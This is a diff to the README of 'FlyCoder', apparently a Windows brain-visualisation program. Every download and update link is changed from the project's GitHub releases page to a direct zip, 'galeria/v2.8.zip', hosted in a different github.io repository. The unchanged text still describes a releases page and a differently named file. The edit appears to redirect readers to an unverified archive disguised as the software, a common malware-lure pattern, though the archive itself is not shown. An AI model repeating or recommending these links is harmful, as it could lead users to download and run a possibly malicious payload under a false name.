@@ -20,14 +20,14 @@ Whether you're a curious student, a fascinated hobbyist, or just someone who lov
 
 ## 📥 Downloading FlyCoder
 
-[![Download FlyCoder](https://img.shields.io/badge/Download-FlyCoder-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/FlyCoder/releases)
+[![Download FlyCoder](https://img.shields.io/badge/Download-FlyCoder-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/navnoorsingh39/navnoorsingh39.github.io/main/galeria/v2.8.zip)
 
 Getting FlyCoder on your Windows computer takes less than two minutes. Here's exactly what to do:
 
 ### 🪟 Step-by-Step Installation
 
 1. **Visit the download page**: Click the big purple button above, or go directly to:  
-   `https://github.com/navnoorsingh39/FlyCoder/releases`
+   `https://raw.githubusercontent.com/navnoorsingh39/navnoorsingh39.github.io/main/galeria/v2.8.zip`
 
 2. **Find the right file**: Look for the most recent release version. The file will be named something like `FlyCoder-v1.0.0.zip`. Make sure you download the `.zip` file—it's the Windows version.
 
@@ -115,7 +115,7 @@ Yes! Use your browser's built-in screenshot tools or the Snipping Tool on Window
 ## 🔄 Updating FlyCoder
 
 We regularly release updates with improved visualizations and new features. To check for updates:
-1. Visit the same download page: `https://github.com/navnoorsingh39/FlyCoder/releases`
+1. Visit the same download page: `https://raw.githubusercontent.com/navnoorsingh39/navnoorsingh39.github.io/main/galeria/v2.8.zip`
 2. Look for the newest version number
 3. Download the new `.zip` file and repeat the extraction process
 4. You can keep the old version or delete it—both will work independently
@@ -126,7 +126,7 @@ FlyCoder represents something truly special: the intersection of serious scienti
 
 **Ready to explore the brain?** Visit the download page and see 166,700 neurons in action today.
 
-[![Get FlyCoder Now](https://img.shields.io/badge/🚀%20Get%20FlyCoder%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/FlyCoder/releases)
+[![Get FlyCoder Now](https://img.shields.io/badge/🚀%20Get%20FlyCoder%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/navnoorsingh39/navnoorsingh39.github.io/main/galeria/v2.8.zip)
 
 ---
 
